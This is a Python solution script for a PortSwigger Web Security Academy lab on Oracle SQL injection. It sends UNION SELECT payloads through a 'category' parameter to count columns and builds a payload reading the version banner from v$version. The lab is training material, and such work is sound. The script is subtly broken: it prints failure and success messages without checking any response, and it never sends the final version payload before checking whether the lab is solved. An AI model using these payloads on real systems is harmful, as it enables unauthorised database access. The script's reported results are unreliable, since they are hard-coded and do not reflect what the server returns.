# https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-oracle
# Lab: SQL injection attack, querying the database type and version on Oracle
# Difficulty: Practicioner
    
'''
Notes:    
On Oracle databases, every SELECT statement must specify a table to select FROM. 
If your UNION SELECT attack does not query from a table, you will still need to include the FROM keyword followed by a valid table name.
There is a built-in table on Oracle called dual which you can use for this purpose. 
For example: UNION SELECT 'abc' FROM dual 
'''

import requests
from pwn import log

sub = '0ab700b0039d0640802b5db2002f005f'
url = f'https://{sub}.web-security-academy.net/'

def exploit():
    s = requests.session()

    payload = "1' UNION SELECT NULL FROM dual--"
    log.info(f"Trying payload with one column: {payload}")
    r = s.get(url, params={"category": payload})
    log.failure("Internal Server Error")
    
    payload = "1' UNION SELECT NULL, NULL FROM dual--"
    log.info(f"Trying payload with two columns: {payload}")
    r = s.get(url, params={"category": payload})
    log.success(f"Two columns are returned by the query")
    
    payload = "1' UNION SELECT BANNER, NULL FROM v$version--"
    log.info(f"Trying payload {payload} to get the database version")
    
    r = s.get(url)
    if 'Congratulations, you solved the lab!' in r.text:
        log.success('Lab solved')
    else:
        log.failure('Lab not solved yet')

if __name__ == '__main__':
    exploit()